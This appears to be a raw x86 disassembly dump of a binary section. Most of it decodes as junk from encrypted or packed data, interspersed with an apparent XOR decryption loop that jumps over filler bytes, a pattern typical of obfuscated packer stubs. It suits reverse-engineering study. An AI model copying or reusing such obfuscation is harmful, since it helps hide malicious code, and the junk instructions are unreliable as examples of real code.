  4058e8:	add    bh,BYTE PTR [ecx]
  4058ea:	stc    
  4058eb:	mov    edi,0x25f675d0
  4058f0:	sub    BYTE PTR [ebx],ch
  4058f2:	push   cs
  4058f3:	jnp    0x4058dd
  4058f5:	adc    eax,ebx
  4058f7:	cdq    
  4058f8:	das    
  4058f9:	xlat   BYTE PTR ds:[ebx]
  4058fa:	repz sub DWORD PTR [edi],0x4e5746b5
  405901:	push   ebp
  405902:	add    eax,DWORD PTR [esi+0x13c76d5f]
  405908:	sub    dl,dh
  40590a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40590b:	jb     0x405898
  40590d:	shl    BYTE PTR [ebp+ecx*8-0x69],1
  405911:	sbb    BYTE PTR [edx-0x5f],al
  405914:	cmp    DWORD PTR [ebp+0x71],ebp
  405917:	mov    ds:0x41f1168d,eax
  40591c:	push   ebp
  40591d:	ret    0x63bd
  405920:	idiv   bl
  405922:	stc    
  405923:	mov    edx,0xc2342ec8
  405928:	loop   0x4058bd
  40592a:	ja     0x405914
  40592c:	add    ch,bh
  40592e:	mov    bh,0xfd
  405930:	push   ds
  405931:	sub    al,0xb2
  405933:	pop    ebp
  405934:	addr16 nop
  405936:	das    
  405937:	aad    0x68
  405939:	(bad)  
  40593b:	mov    dl,0x1
  40593d:	std    
  40593e:	push   ebx
  40593f:	xor    dl,bl
  405941:	repnz push cs
  405943:	jmp    0x1d1af39a
  405948:	dec    ebx
  405949:	test   BYTE PTR [ebx],dl
  40594b:	in     al,dx
  40594c:	inc    edx
  40594d:	pop    edi
  40594e:	xchg   esp,eax
  40594f:	jo     0x405970
  405951:	mov    eax,ds:0x1f201fb1
  405956:	popf   
  405957:	xlat   BYTE PTR ds:[ebx]
  405958:	sub    al,0x27
  40595a:	fdiv   st(5),st
  40595c:	xchg   ebx,eax
  40595d:	inc    eax
  40595e:	(bad)  
  40595f:	mov    ch,0x1
  405961:	loop   0x40598b
  405963:	add    dh,0xe9
  405966:	xchg   esp,esp
  405968:	pop    ds
  405969:	fst    QWORD PTR [edi+0x48362569]
  40596f:	jo     0x40595e
  405971:	pusha  
  405972:	mov    ch,BYTE PTR [edi]
  405974:	sbb    eax,0xcd50c228
  405979:	adc    eax,DWORD PTR [ecx-0x5fd1275]
  40597f:	mov    eax,ds:0x3e5e4416
  405984:	mov    eax,0x2ff3244d
  405989:	jp     0x405981
  40598b:	or     BYTE PTR [eax+0x13],dh
  40598e:	pop    es
  40598f:	cmp    DWORD PTR [edi+0x64],esi
  405992:	jne    0x4059d0
  405994:	mov    al,ds:0x5cbe5e3
  405999:	outs   dx,DWORD PTR ds:[esi]
  40599a:	mov    edx,0x8e38cda5
  40599f:	clc    
  4059a0:	dec    ebx
  4059a1:	dec    ecx
  4059a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059a3:	test   eax,0xea121c99
  4059a8:	sub    bh,dh
  4059aa:	and    DWORD PTR [edi],ebp
  4059ac:	adc    DWORD PTR [esi+0x276147af],0xc9a08fa1
  4059b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b7:	pop    edx
  4059b8:	xlat   BYTE PTR ds:[ebx]
  4059b9:	(bad)  
  4059ba:	or     bl,BYTE PTR [ecx+ebp*8]
  4059bd:	fsub   DWORD PTR [eax-0x19bc1156]
  4059c3:	out    0x67,al
  4059c5:	std    
  4059c6:	lock pusha 
  4059c8:	mov    dh,0xcc
  4059ca:	es out 0xf2,eax
  4059cd:	lds    ebx,FWORD PTR [ebx-0x62f5a55c]
  4059d3:	push   edx
  4059d4:	pop    esp
  4059d5:	ret    0x35a0
  4059d8:	test   BYTE PTR [ebp-0x6d05a5e6],ah
  4059de:	arpl   WORD PTR [edx],dx
  4059e0:	adc    esi,DWORD PTR [ecx]
  4059e2:	mov    dl,0x3c
  4059e4:	mov    ah,0xa3
  4059e6:	ins    BYTE PTR es:[edi],dx
  4059e7:	mov    esp,0x7fa6e39b
  4059ec:	fdivr  DWORD PTR ds:0xa28bd3ef
  4059f2:	or     eax,0xbe5d66dd
  4059f7:	jge    0x4059dd
  4059f9:	clc    
  4059fa:	or     BYTE PTR [eax+0x32],dh
  4059fd:	cli    
  4059fe:	or     al,0x9b
  405a00:	push   esp
  405a01:	xchg   ebp,eax
  405a02:	adc    edx,esi
  405a04:	sbb    eax,0xa7390250
  405a09:	mov    edi,0x36289985
  405a0e:	ret    0x5dd2
  405a11:	inc    ebx
  405a12:	jne    0x405a2e
  405a14:	sub    DWORD PTR [esi+0xf4b0911],ecx
  405a1a:	adc    eax,0xbe5204f7
  405a1f:	mov    eax,DWORD PTR ds:0x557a3892
  405a25:	push   0x18bfaacc
  405a2a:	and    BYTE PTR [ecx-0xe090cb7],0xa2
  405a31:	js     0x405a22
  405a33:	cmc    
  405a34:	daa    
  405a35:	xchg   esi,eax
  405a36:	cld    
  405a37:	leave  
  405a38:	inc    ecx
  405a39:	jp     0x405a01
  405a3b:	xor    DWORD PTR [ebx+0x64d46c1f],esi
  405a41:	mov    ebx,0x397f0cfd
  405a46:	inc    esp
  405a47:	loop   0x4059ec
  405a49:	push   ebx
  405a4a:	or     ch,BYTE PTR [ecx-0x9]
  405a4d:	ds clc 
  405a4f:	dec    ecx
  405a50:	pop    es
  405a51:	sub    al,0x41
  405a53:	lods   al,BYTE PTR ds:[esi]
  405a54:	outs   dx,DWORD PTR ds:[esi]
  405a55:	stos   BYTE PTR es:[edi],al
  405a56:	into   
  405a57:	cmp    eax,0x8b9746bf
  405a5c:	mov    esp,0x5b078e54
  405a61:	jb     0x405ad9
  405a63:	mov    bh,0x28
  405a65:	aad    0x8
  405a67:	inc    eax
  405a68:	sbb    al,0x67
  405a6a:	jge    0x405a54
  405a6c:	jb     0x405a8c
  405a6e:	ds and ebx,ebp
  405a71:	imul   edi,DWORD PTR [edx+0x387a286b],0x4e
  405a78:	add    ah,BYTE PTR [eax]
  405a7a:	and    DWORD PTR [edi-0x23],ebp
  405a7d:	inc    ebx
  405a7e:	aam    0x36
  405a80:	out    dx,al
  405a81:	jmp    0xbd4b:0x689fbc73
  405a88:	repnz push 0x22
  405a8b:	mov    bh,0x1d
  405a8d:	sub    ah,BYTE PTR [ecx-0x20a8f8c3]
  405a93:	adc    BYTE PTR [ebp-0x73],bh
  405a96:	and    eax,0xd28b7df
  405a9b:	and    ah,ch
  405a9d:	push   es
  405a9e:	iret   
  405a9f:	pop    eax
  405aa0:	pop    esp
  405aa1:	imul   edi,edx,0x5
  405aa4:	jnp    0x405a55
  405aa6:	pop    edx
  405aa7:	loop   0x405b25
  405aa9:	add    ecx,DWORD PTR [eax-0x22]
  405aac:	mov    ah,0x99
  405aae:	test   BYTE PTR [edx],0x66
  405ab1:	dec    ebx
  405ab2:	daa    
  405ab3:	outs   dx,DWORD PTR ds:[esi]
  405ab4:	nop
  405ab5:	pushf  
  405ab6:	mov    edx,0xb013b3f1
  405abb:	dec    edx
  405abc:	inc    ebx
  405abd:	cmp    eax,0xfd69b626
  405ac2:	sbb    dl,BYTE PTR [ecx+0x6b]
  405ac5:	push   0x99b0564b
  405aca:	jnp    0x405aeb
  405acc:	mov    bl,0x8b
  405ace:	inc    esp
  405acf:	mov    bh,0x1
  405ad1:	and    DWORD PTR [edi],ebp
  405ad3:	mov    ecx,0x52fa26c9
  405ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad9:	dec    edx
  405ada:	in     al,dx
  405adb:	imul   eax,edx,0x20
  405ade:	jb     0x405afb
  405ae0:	aas    
  405ae1:	dec    ecx
  405ae2:	jb     0x405b37
  405ae4:	and    ah,dl
  405ae6:	ins    DWORD PTR es:[edi],dx
  405ae7:	mov    WORD PTR [eax+ecx*1+0x17d757f],ss
  405aee:	aas    
  405aef:	xor    eax,0x7df60ad1
  405af4:	sub    esi,ecx
  405af6:	lods   eax,DWORD PTR ds:[esi]
  405af7:	xor    eax,0xe7f3e912
  405afc:	in     eax,0x8b
  405afe:	stc    
  405aff:	adc    edi,DWORD PTR [edx-0x44b9b707]
  405b05:	jo     0x405aab
  405b07:	sub    BYTE PTR [eax+0x6af94bb3],dh
  405b0d:	mov    WORD PTR [edi+0x23],?
  405b10:	int3   
  405b11:	sub    ah,BYTE PTR [ebp-0x15]
  405b14:	imul   esp,DWORD PTR [ecx+0x4a],0xffffffc7
  405b18:	call   0xdab5:0x8f6c97c9
  405b1f:	fistp  DWORD PTR [edi+eax*1]
  405b22:	inc    esp
  405b23:	sti    
  405b24:	and    BYTE PTR [ebx+0x25],bl
  405b27:	and    eax,0x146d9b72
  405b2c:	out    dx,al
  405b2d:	or     al,0x75
  405b2f:	aam    0x2a
  405b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b32:	aam    0x34
  405b34:	(bad)  
  405b35:	bswap  ebp
  405b37:	pop    edi
  405b38:	push   cs
  405b39:	jno    0x405ae3
  405b3b:	fistp  DWORD PTR ds:0x1581a39
  405b41:	sbb    ch,BYTE PTR [ecx+0x6220431]
  405b47:	push   es
  405b48:	call   eax
  405b4a:	cmp    ecx,DWORD PTR [ebx+0x7ab7d057]
  405b50:	inc    ecx
  405b51:	ret    
  405b52:	and    bh,BYTE PTR [edi-0x59]
  405b55:	adc    BYTE PTR [edi+eax*2],0x27
  405b59:	into   
  405b5a:	mov    al,ds:0x84a3860c
  405b5f:	aaa    
  405b60:	xchg   ecx,eax
  405b61:	stos   BYTE PTR es:[edi],al
  405b62:	xor    dh,cl
  405b64:	call   0x1cab:0x28a6e7df
  405b6b:	les    edx,FWORD PTR [ecx]
  405b6d:	xchg   DWORD PTR [eax-0x70b1ddab],esi
  405b73:	push   eax
  405b74:	mov    edx,0xdc5490f5
  405b79:	cwde   
  405b7a:	xor    ebp,DWORD PTR [edi-0x18386197]
  405b80:	daa    
  405b81:	cli    
  405b82:	dec    esi
  405b83:	adc    eax,0x9b4cee34
  405b88:	ja     0x405be2
  405b8a:	lea    ecx,[ebp+0x2c444765]
  405b90:	dec    edi
  405b91:	jp     0x405b34
  405b93:	cdq    
  405b94:	dec    esp
  405b95:	xchg   ebp,eax
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	push   ecx
  405b98:	jmp    0xd545:0x89ab5a29
  405b9f:	in     al,0xbf
  405ba1:	adc    BYTE PTR [ebx],bl
  405ba3:	ss mov bl,0xe
  405ba6:	icebp  
  405ba7:	mov    ah,0xc7
  405ba9:	xor    al,0xa6
  405bab:	mov    BYTE PTR [edi-0x20f5af0c],dl
  405bb1:	sbb    BYTE PTR [edi+0x9db22e2],ch
  405bb7:	inc    edi
  405bb8:	scas   eax,DWORD PTR es:[edi]
  405bb9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bbb:	fsubr  QWORD PTR [esi+0x5f]
  405bbe:	pop    eax
  405bbf:	into   
  405bc0:	fnstenv [ecx+0x46]
  405bc3:	xchg   edi,eax
  405bc4:	mov    esi,0x45103024
  405bc9:	sbb    BYTE PTR [ecx+0x22],0xf7
  405bcd:	daa    
  405bce:	or     eax,0x4e79cfd0
  405bd3:	ror    BYTE PTR [eax+0x45],0xd
  405bd7:	jae    0x405c03
  405bd9:	ins    BYTE PTR es:[edi],dx
  405bda:	fbstp  TBYTE PTR [edi]
  405bdc:	push   eax
  405bdd:	push   edx
  405bde:	pop    eax
  405bdf:	inc    esi
  405be0:	sbb    al,0x99
  405be2:	(bad)  
  405be3:	btr    DWORD PTR [esi],edx
  405be6:	mov    ecx,0xb8d0d5a
  405beb:	pop    edx
  405bec:	pusha  
  405bed:	cmp    BYTE PTR [eax-0x119ed732],0x88
  405bf4:	jb     0x405c1a
  405bf6:	repz std 
  405bf8:	ins    BYTE PTR es:[edi],dx
  405bf9:	xchg   esp,eax
  405bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bfb:	jg     0x405be6
  405bfd:	fs mov dh,0x8b
  405c00:	into   
  405c01:	sbb    dl,BYTE PTR [edi+0x5e]
  405c04:	popf   
  405c05:	adc    esp,DWORD PTR [ebp-0x4f]
  405c08:	int    0x9e
  405c0a:	popf   
  405c0b:	fucompp 
  405c0d:	lea    ebx,[ebx+ebp*1+0x107d03f8]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xa75d0ed0,dx
  405c45:	mov    al,ds:0x3b50852f
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0xc97e7e71
  405c51:	ficomp WORD PTR [ebx+0x36]
  405c54:	shr    BYTE PTR [esi+ebp*2-0x4c4a1b10],1
  405c5b:	jno    0x405c81
  405c5d:	int    0x7f
  405c5f:	pcmpgtd mm1,QWORD PTR [edx]
  405c62:	inc    esi
  405c63:	dec    esi
  405c64:	pop    edx
  405c65:	add    BYTE PTR [ebp+0x4106d662],al
  405c6b:	in     eax,dx
  405c6c:	mov    esi,?
  405c6e:	cmp    BYTE PTR [eax],ah
  405c70:	adc    eax,0x7816fa87
  405c75:	inc    ecx
  405c76:	fwait
  405c77:	push   ds
  405c78:	sbb    BYTE PTR [esi+ecx*2-0x35efdcef],0x2d
  405c80:	cmc    
  405c81:	in     eax,0x7e
  405c83:	pop    esp
  405c84:	dec    ebp
  405c85:	and    al,0xc1
  405c87:	add    al,0x27
  405c89:	mov    ch,BYTE PTR [ebx]
  405c8b:	sub    al,BYTE PTR [edx]
  405c8d:	xchg   edi,eax
  405c8e:	int    0x91
  405c90:	ror    dh,0x17
  405c93:	rol    edi,cl
  405c95:	mov    al,0xff
  405c97:	test   bh,0x19
  405c9a:	popf   
  405c9b:	retf   
  405c9c:	inc    esi
  405c9d:	push   edx
  405c9e:	push   0xffffffef
  405ca0:	sub    BYTE PTR [ebp+0x5bb9bef6],0x97
  405ca7:	out    0x1e,eax
  405ca9:	jno    0x405c2b
  405cab:	or     DWORD PTR [edi+0x7],0xad582863
  405cb2:	repnz dec dx
  405cb5:	adc    eax,0x3e5f9cec
  405cba:	dec    esi
  405cbb:	inc    esi
  405cbc:	sub    eax,0x8e1db8cd
  405cc1:	push   ecx
  405cc2:	push   esp
  405cc3:	repnz sub ebx,DWORD PTR [edi]
  405cc6:	mov    ds:0x9bc9a48e,al
  405ccb:	dec    eax
  405ccc:	cmp    eax,0x9f58cd7
  405cd1:	cmp    ebp,0xd32c8a5d
  405cd7:	test   DWORD PTR [ecx],0x69110145
  405cdd:	out    dx,al
  405cde:	cs push esp
  405ce0:	mov    esp,0xd642723
  405ce5:	inc    edx
  405ce6:	gs ret 0xc379
  405cea:	mov    cs,WORD PTR [esi+eax*4+0x2cd29d71]
  405cf1:	mov    esp,DWORD PTR [ebp+ebp*8-0x6889c31d]
  405cf8:	out    0x78,eax
  405cfa:	mov    edi,0xc8cf8f47
  405cff:	push   0x60
  405d01:	inc    esp
  405d02:	adc    DWORD PTR [ecx],ebp
  405d04:	into   
  405d05:	mov    eax,0xcc446301
  405d0a:	mov    al,0x5a
  405d0c:	push   es
  405d0d:	sub    al,0x93
  405d0f:	stc    
  405d10:	xchg   ebx,eax
  405d11:	test   dl,ch
  405d13:	jo     0x405d56
  405d15:	pop    eax
  405d16:	push   edi
  405d17:	mov    ebx,0xdca72207
  405d1c:	imul   ecx
  405d1e:	stc    
  405d1f:	mov    ds:0x75dc26ac,eax
  405d24:	jmp    0xe8b6753c
  405d29:	xor    DWORD PTR [edi-0x4c],0xe
  405d2d:	add    BYTE PTR [edx-0x7c],ch
  405d30:	test   DWORD PTR [eax+edi*4+0x154c7d4b],edi
  405d37:	shl    cl,0xcc
  405d3a:	pop    esi
  405d3b:	mov    edi,0x19023cf0
  405d40:	pop    edi
  405d41:	data16 test cl,0x86
  405d45:	(bad)  
  405d46:	stos   DWORD PTR es:[edi],eax
  405d47:	loop   0x405d16
  405d49:	retf   
  405d4a:	loope  0x405d6d
  405d4c:	icebp  
  405d4d:	call   0x2b5b8589
  405d52:	adc    esi,DWORD PTR [ecx+0x33c15a2d]
  405d58:	jmp    0xd424:0x83def49c
  405d5f:	inc    esp
  405d60:	jp     0x405d61
  405d62:	pop    ebp
  405d63:	xchg   ecx,eax
  405d64:	pop    es
  405d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d66:	mov    ecx,0xaf81ab14
  405d6b:	std    
  405d6c:	jle    0x405d8a
  405d6e:	or     ch,cl
  405d70:	xor    ebp,DWORD PTR [edx]
  405d72:	xor    al,0x51
  405d74:	ds call 0x45bf33e9
  405d7a:	clc    
  405d7b:	icebp  
  405d7c:	cld    
  405d7d:	(bad)  
  405d7e:	mov    esp,0xb51821f7
  405d83:	sbb    eax,0xa745a6d7
  405d88:	adc    DWORD PTR [eax+0x2b],esi
  405d8b:	in     eax,0xe5
  405d8d:	fdiv   DWORD PTR [ebx-0x1be06501]
  405d93:	cmc    
  405d94:	pop    ds
  405d95:	add    eax,0x4bb562cc
  405d9a:	int    0x5b
  405d9c:	pop    esi
  405d9d:	mov    DWORD PTR [edi-0x7d],ebx
  405da0:	adc    eax,0xfe0c54ab
  405da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da6:	ret    0xc7d9
  405da9:	stos   BYTE PTR es:[edi],al
  405daa:	js     0x405d43
  405dac:	in     eax,0x7
  405dae:	fwait
  405daf:	es mov gs,edi
  405db2:	leave  
  405db3:	jg     0x405dd6
  405db5:	clc    
  405db6:	imul   esi,DWORD PTR [ecx+0x4f],0x1f
  405dba:	cwde   
  405dbb:	lods   al,BYTE PTR ds:[esi]
  405dbc:	jmp    0xce54500e
  405dc1:	aad    0xc5
  405dc3:	call   esp
  405dc5:	cli    
  405dc6:	pop    esp
  405dc7:	jnp    0x405dc7
  405dc9:	xchg   DWORD PTR [eax+0x19680898],ebp
  405dcf:	ret    
  405dd0:	addr16 mov eax,0x88273aa0
  405dd6:	loope  0x405e43
  405dd8:	scas   eax,DWORD PTR es:[edi]
  405dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dda:	retf   0xb4a3
  405ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dde:	int    0xde
  405de0:	sbb    BYTE PTR [ecx-0x76f6e2d3],bh
  405de6:	push   edx
  405de7:	xor    dl,dl
  405de9:	sub    BYTE PTR [edi+ebx*8],cl
  405dec:	lods   eax,DWORD PTR ds:[esi]
  405ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dee:	cld    
  405def:	aas    
  405df0:	loop   0x405d78
  405df2:	and    cl,BYTE PTR [ebx+eiz*2+0x6a936362]
  405df9:	or     cl,dh
  405dfb:	sbb    dh,cl
  405dfd:	fisttp QWORD PTR [ecx+0x6]
  405e00:	mov    ebp,0x1777fafb
  405e05:	lods   al,BYTE PTR ds:[esi]
  405e06:	cmp    bl,BYTE PTR [edi-0x4c084dd2]
  405e0c:	mov    ch,ch
  405e0e:	test   BYTE PTR [eax-0x592d376f],ch
  405e14:	add    dl,cl
  405e16:	sbb    eax,0xcb3ea976
  405e1b:	xor    bl,BYTE PTR [edi+eax*2-0x7938135d]
  405e22:	in     eax,dx
  405e23:	jno    0x405db1
  405e25:	cld    
  405e26:	(bad)  
  405e27:	je     0x405e8c
  405e29:	pop    esi
  405e2a:	loope  0x405e09
  405e2c:	adc    eax,DWORD PTR [esp+eax*8+0x76ea1e99]
  405e33:	cmp    ecx,DWORD PTR [esi+0x5c]
  405e36:	pop    edi
  405e37:	ins    BYTE PTR es:[edi],dx
  405e38:	test   DWORD PTR [ecx-0x33],edi
  405e3b:	add    eax,0x6400af0b
  405e40:	fild   DWORD PTR [ebx]
  405e42:	test   BYTE PTR [edx+0x74],ch
  405e45:	pcmpeqd mm3,QWORD PTR [ecx-0xa4b1fdb]
  405e4c:	aam    0x4f
  405e4e:	outs   dx,DWORD PTR ds:[esi]
  405e4f:	xor    eax,0xb35e8c70
  405e54:	push   edx
  405e55:	imul   eax,DWORD PTR [esp+ebp*2+0x76],0x7ada936
  405e5d:	in     eax,0xdb
  405e5f:	inc    ecx
  405e60:	dec    esi
  405e61:	leave  
  405e62:	inc    eax
  405e63:	rol    BYTE PTR [esp+ebp*4-0x17],0x5
  405e68:	stos   DWORD PTR es:[edi],eax
  405e69:	sbb    BYTE PTR [eax+0x12],dl
  405e6c:	ret    
  405e6d:	mov    edi,DWORD PTR ds:0xe66ff1b9
  405e73:	pusha  
  405e74:	or     esi,DWORD PTR [ecx+0x6e]
  405e77:	jno    0x405e11
  405e79:	adc    ah,0x80
  405e7c:	jo     0x405e03
  405e7e:	sti    
  405e7f:	adc    eax,ebp
  405e81:	rcl    esi,1
  405e83:	xor    DWORD PTR [ebx+0x49e8cd33],0xffffffd2
  405e8a:	jg     0x405e26
  405e8c:	push   esi
  405e8d:	add    al,0x48
  405e8f:	dec    edi
  405e90:	pop    ecx
  405e91:	or     bh,0xe2
  405e94:	out    0x67,al
  405e96:	adc    esp,DWORD PTR [ebp-0x3e]
  405e99:	test   DWORD PTR [eax-0x6c],ebx
  405e9c:	mov    bh,0x20
  405e9e:	jno    0x405eaa
  405ea0:	lods   eax,DWORD PTR ds:[esi]
  405ea1:	sub    edx,DWORD PTR [ecx-0x5a0247ac]
  405ea7:	sbb    dh,BYTE PTR [ecx+0x45]
  405eaa:	mov    esp,0x57509728
  405eaf:	mov    ss,edx
  405eb1:	jae    0x405e6f
  405eb3:	mov    eax,0x71f2f163
  405eb8:	aaa    
  405eb9:	enter  0x44eb,0x78
  405ebd:	pusha  
  405ebe:	mov    edx,cs
  405ec0:	push   ds
  405ec1:	xor    BYTE PTR [ecx+ecx*8-0xe],bl
  405ec5:	loope  0x405ef6
  405ec7:	int    0xc
  405ec9:	mov    ecx,DWORD PTR [esi]
  405ecb:	dec    esp
  405ecc:	and    edx,edi
  405ece:	xlat   BYTE PTR ds:[ebx]
  405ecf:	push   es
  405ed0:	inc    edx
  405ed1:	outs   dx,DWORD PTR ds:[esi]
  405ed2:	rcr    BYTE PTR [ecx+0x484414e4],0x94
  405ed9:	cmp    bh,BYTE PTR ds:0x306800e8
  405edf:	push   ecx
  405ee0:	xor    eax,0x8425dba3
  405ee5:	rol    al,1
  405ee7:	fbld   TBYTE PTR [eax-0x80]
  405eea:	in     eax,dx
  405eeb:	fs mov edx,0x7d25fc69
  405ef1:	int    0x8e
  405ef3:	mov    eax,ds:0x5243282c
  405ef8:	pop    ebx
  405ef9:	addr16 or eax,0x310409ac
  405eff:	jle    0x405e9f
  405f01:	dec    esp
  405f02:	inc    ebp
  405f03:	(bad)  
  405f04:	pop    eax
  405f05:	inc    ebp
  405f06:	mul    BYTE PTR [eax+edi*4-0x7faa1436]
  405f0d:	or     BYTE PTR [esi+0x49],ah
  405f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f11:	adc    eax,0x7efac8b7
  405f16:	push   0x8ae13a38
  405f1b:	push   ecx
  405f1c:	(bad)  
  405f1e:	gs jbe 0x405ea6
  405f21:	rcl    DWORD PTR [esi],cl
  405f23:	pop    es
  405f24:	xchg   ebp,eax
  405f25:	retf   
  405f26:	mov    ds:0xed09fe57,eax
  405f2b:	rcl    dh,cl
  405f2d:	sbb    al,bl
  405f2f:	mov    BYTE PTR [ebx],ch
  405f31:	pop    ecx
  405f32:	push   es
  405f33:	lock pop edx
  405f35:	sbb    cl,BYTE PTR [esi+esi*2-0x61]
  405f39:	test   al,0x8c
  405f3b:	or     ebp,DWORD PTR [ecx+0x7c793b8f]
  405f41:	and    eax,0x425f8fe2
  405f46:	and    al,bh
  405f48:	outs   dx,DWORD PTR ds:[esi]
  405f49:	sub    ah,0x61
  405f4c:	xor    bh,bl
  405f4e:	adc    al,0xda
  405f50:	inc    esi
  405f51:	jb     0x405ef1
  405f53:	(bad)  
  405f54:	ja     0x405faa
  405f56:	repnz or al,0xc7
  405f59:	adc    DWORD PTR [esi-0x41],esi
  405f5c:	stos   DWORD PTR es:[edi],eax
  405f5d:	out    0x6d,al
  405f5f:	jo     0x405fb0
  405f61:	or     eax,esi
  405f63:	adc    DWORD PTR ds:0xc2723f6b,ecx
  405f69:	mov    al,ds:0xaa081ffc
  405f6e:	and    edx,DWORD PTR [eax-0x80]
  405f71:	push   0x3d
  405f73:	mov    bh,0xe3
  405f75:	sub    ch,BYTE PTR [ebx-0x18d405b3]
  405f7b:	scas   eax,DWORD PTR es:[edi]
  405f7c:	ror    DWORD PTR [edi],0xe1
  405f7f:	(bad)  
  405f81:	sbb    al,0x54
  405f83:	add    al,0xe
  405f85:	jl     0x405f10
  405f87:	sub    al,0xa6
  405f89:	and    eax,0xdfc5740f
  405f8e:	or     eax,0xdcf5907f
  405f93:	in     al,0xa
  405f95:	pop    ss
  405f96:	sti    
  405f97:	stos   BYTE PTR es:[edi],al
  405f98:	fdivr  DWORD PTR [ebp+ebx*8-0x38]
  405f9c:	xor    BYTE PTR [ebp+ebp*4-0x2],0x27
  405fa1:	add    eax,DWORD PTR [ecx]
  405fa3:	inc    esp
  405fa4:	lahf   
  405fa5:	lods   al,BYTE PTR ds:[esi]
  405fa6:	inc    edi
  405fa7:	push   es
  405fa8:	xchg   ebp,eax
  405fa9:	aas    
  405faa:	cmp    eax,ebp
  405fac:	mov    ebp,DWORD PTR [edi-0x4e1d1b0b]
  405fb2:	fild   WORD PTR ss:[ecx+0xb]
  405fb6:	sub    al,ch
  405fb8:	std    
  405fb9:	js     0x405fdb
  405fbb:	out    dx,eax
  405fbc:	aad    0x69
  405fbe:	adc    al,0x8e
  405fc0:	test   BYTE PTR [ecx-0x6b],bl
  405fc3:	xor    DWORD PTR [edi],esp
  405fc5:	adc    BYTE PTR [ebp-0x4284c9a1],dl
  405fcb:	aad    0xb3
  405fcd:	scas   al,BYTE PTR es:[edi]
  405fce:	lock enter 0x3d96,0x94
  405fd3:	ror    BYTE PTR [eax],1
  405fd5:	cmp    esp,DWORD PTR [ecx+edx*8-0x2a9968c2]
  405fdc:	call   0x642937f
  405fe1:	das    
  405fe2:	sbb    esp,DWORD PTR [esi]
  405fe4:	sbb    BYTE PTR ds:0x8c323191,al
  405fea:	xchg   DWORD PTR [esp+edx*4-0x1],esi
  405fee:	mov    bh,0x3a
  405ff0:	into   
  405ff1:	and    BYTE PTR [esi-0x7e823895],ch
  405ff7:	stos   DWORD PTR es:[edi],eax
  405ff8:	pop    es
  405ff9:	fldenv [ecx-0x59]
  405ffc:	jne    0x405fb9
  405ffe:	out    0x83,eax
  406000:	cli    
  406001:	cs loope 0x405fd2
  406004:	mov    edi,0x9f71706f
  406009:	aad    0x77
  40600b:	clc    
  40600c:	in     eax,dx
  40600d:	xchg   esi,eax
  40600e:	rol    BYTE PTR [ebx],cl
  406010:	dec    BYTE PTR [ebx-0x50f0f78b]
  406016:	cli    
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	sub    eax,0x9f50774d
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x4f7e7e71
  406063:	jbe    0x405fed
  406065:	fmul   st(1),st
  406067:	xor    eax,0xa99021f
  40606c:	push   cs
  40606d:	or     ch,BYTE PTR [ebp-0x4e]
  406070:	cs out 0xc2,al
  406073:	lods   al,BYTE PTR ds:[esi]
  406074:	sub    DWORD PTR [esi],edi
  406076:	ficom  DWORD PTR [ebx+0x4e]
  406079:	ins    DWORD PTR es:[edi],dx
  40607a:	ret    0x7e00
  40607d:	sbb    cl,BYTE PTR [edx]
  40607f:	mov    ecx,DWORD PTR [esi+0x28]
  406082:	icebp  
  406083:	cld    
  406084:	in     al,0xf2
  406086:	in     al,0x3d
  406088:	sbb    dl,BYTE PTR [eax-0x45]
  40608b:	(bad)  
  40608c:	stc    
  40608d:	mov    esi,0xcc0c33dc
  406092:	cmp    eax,0x8fc60fc5
  406097:	push   esi
  406098:	mov    edx,0x9b93d5c0
  40609d:	(bad)  
  40609e:	push   ss
  40609f:	add    DWORD PTR [ebx],edi
  4060a1:	nop
  4060a2:	sbb    ebp,DWORD PTR ss:[edx-0x22]
  4060a6:	xor    eax,0xf7172e16
  4060ab:	(bad)  
  4060ac:	ds aad 0xca
  4060af:	or     DWORD PTR [ebp-0x36],ebx
  4060b2:	sti    
  4060b3:	push   0xffffffc5
  4060b5:	leave  
  4060b6:	fdiv   DWORD PTR [eax]
  4060b8:	dec    ebx
  4060b9:	push   ebp
  4060ba:	dec    ebx
  4060bb:	or     bh,BYTE PTR [esi+0x5ade13d7]
  4060c1:	fsubr  QWORD PTR [ebp+0x1ce51639]
  4060c7:	mov    ecx,0xf459db9d
